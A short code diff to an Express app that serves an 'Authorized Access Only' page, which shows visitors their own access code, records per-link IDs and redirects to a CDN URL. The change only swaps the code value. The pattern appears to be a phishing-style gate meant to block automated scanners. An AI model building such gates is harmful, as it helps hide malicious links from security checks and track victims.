@@ -577,7 +577,7 @@ const myHTML = `
       <div class="form-header">
         <span class="form-eyebrow">Authorized Access Only</span>
         <h2 class="form-title">Enter the password to view</h2>
-        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: Quote435</p>
+        <p class="form-subtitle">This document requires a valid access code to proceed. Your Access Code: 223490</p>
       </div>
 
       <div class="form-description">
@@ -655,7 +655,7 @@ const myHTML = `
 app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
-  const CORRECT_CODE = "Quote435";
+  const CORRECT_CODE = "223490";
   const TARGET_URL = "https://edge-4c50a77734bb-mumqvg3t.b-cdn.net";
 
   if (code === CORRECT_CODE) {
